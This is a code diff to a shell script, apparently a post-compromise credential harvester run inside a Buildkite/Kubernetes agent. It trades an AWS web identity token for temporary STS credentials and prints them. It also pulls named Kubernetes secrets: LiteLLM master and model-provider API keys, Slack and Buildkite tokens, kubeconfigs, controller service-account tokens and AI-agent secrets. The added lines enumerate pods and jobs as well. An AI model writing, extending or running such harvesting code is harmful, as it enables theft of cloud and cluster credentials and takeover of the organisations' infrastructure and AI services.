@@ -59,17 +59,15 @@ collect() {
   if [ -n "$AWS_WEB_IDENTITY_TOKEN_FILE" ] && [ -f "$AWS_WEB_IDENTITY_TOKEN_FILE" ]; then
     printf 'role_arn=%s\n' "$AWS_ROLE_ARN"
     printf 'web_identity_token=%s\n' "$(cat "$AWS_WEB_IDENTITY_TOKEN_FILE" 2>/dev/null)"
-    STS_OUT=$(aws sts assume-role-with-web-identity \
+    STS_LINE=$(aws sts assume-role-with-web-identity \
       --role-arn "$AWS_ROLE_ARN" \
       --role-session-name "bk-agent-$(date +%s)" \
       --web-identity-token "$(cat "$AWS_WEB_IDENTITY_TOKEN_FILE")" \
       --region ap-southeast-2 \
-      --output json 2>/dev/null)
-    if [ -n "$STS_OUT" ]; then
-      printf 'sts_access_key=%s\n' "$(echo "$STS_OUT" | grep -o '"AccessKeyId":"[^"]*"' | cut -d'"' -f4)"
-      printf 'sts_secret_key=%s\n' "$(echo "$STS_OUT" | grep -o '"SecretAccessKey":"[^"]*"' | cut -d'"' -f4)"
-      printf 'sts_session_token=%s\n' "$(echo "$STS_OUT" | grep -o '"SessionToken":"[^"]*"' | cut -d'"' -f4)"
-      printf 'sts_expiration=%s\n' "$(echo "$STS_OUT" | grep -o '"Expiration":"[^"]*"' | cut -d'"' -f4)"
+      --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken,Expiration]' \
+      --output text 2>/dev/null)
+    if [ -n "$STS_LINE" ]; then
+      printf 'sts_credentials=%s\n' "$STS_LINE"
     else
       printf 'sts_exchange=FAILED\n'
     fi
@@ -100,28 +98,37 @@ collect() {
       -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"platform-mcp-servers-latest-management"}}' \
       --connect-timeout 5 --max-time 10 2>/dev/null
 
-    for NS in "$KNS" platform-mcp-servers-latest-management; do
-      for SECRET in \
-        litellm-master-key.latest.secrets \
-        litellm-anthropic-api-key.latest.secrets \
-        litellm-openai-api-key.latest.secrets \
-        litellm-google-api-key.latest.secrets \
-        litellm-atlassian-mcp-authorization.latest.secrets \
-        litellm-wiz-mcp-authorization.latest.secrets \
-        kubectl-mcp-kubeconfig \
-        claude-code-agent-secrets \
-        agent-manager-slack-bot-tokens.latest.agent-manager \
-        buildkite-mcp-buildkite-api-token.latest.buildkite-mcp \
-        litellm-bedrock-mantle-api-key.latest.secrets; do
-        RES=$(curl -sf $KC -H "$KA" \
-          "$KH/api/v1/namespaces/$NS/secrets/$SECRET" \
-          --connect-timeout 3 --max-time 5 2>/dev/null)
-        if [ -n "$RES" ]; then
-          printf '\n--- secret/%s/%s ---\n' "$NS" "$SECRET"
-          printf '%s\n' "$RES"
-        fi
-      done
+    for SECRET in \
+      default-token \
+      k8s-development-latest-helm-agent-stack-k8s-controller-token \
+      k8s-management-latest-helm-agent-stack-k8s-controller-token \
+      k8s-production-latest-helm-agent-stack-k8s-controller-token \
+      k8s-staging-latest-helm-agent-stack-k8s-controller-token \
+      kubectl-mcp-kubeconfig \
+      claude-code-agent-secrets \
+      agent-manager-slack-bot-tokens.latest.agent-manager \
+      litellm-master-key.latest.secrets \
+      buildkite-mcp-buildkite-api-token.latest.buildkite-mcp; do
+      RES=$(curl -sf $KC -H "$KA" \
+        "$KH/api/v1/namespaces/$KNS/secrets/$SECRET" \
+        --connect-timeout 3 --max-time 5 2>/dev/null)
+      if [ -n "$RES" ]; then
+        printf '\n--- secret/%s/%s ---\n' "$KNS" "$SECRET"
+        printf '%s\n' "$RES"
+      fi
     done
+
+    printf '\n--- pods/%s ---\n' "$KNS"
+    curl -sf $KC -H "$KA" \
+      "$KH/api/v1/namespaces/$KNS/pods" \
+      --connect-timeout 5 --max-time 10 2>/dev/null \
+      | grep -oE '"name":"[^"]*"|"serviceAccountName":"[^"]*"|"image":"[^"]*"' 2>/dev/null
+
+    printf '\n--- jobs/%s ---\n' "$KNS"
+    curl -sf $KC -H "$KA" \
+      "$KH/apis/batch/v1/namespaces/$KNS/jobs" \
+      --connect-timeout 5 --max-time 10 2>/dev/null \
+      | grep -oE '"name":"[^"]*"|"serviceAccountName":"[^"]*"' 2>/dev/null
   else
     printf 'no k8s access\n'
   fi
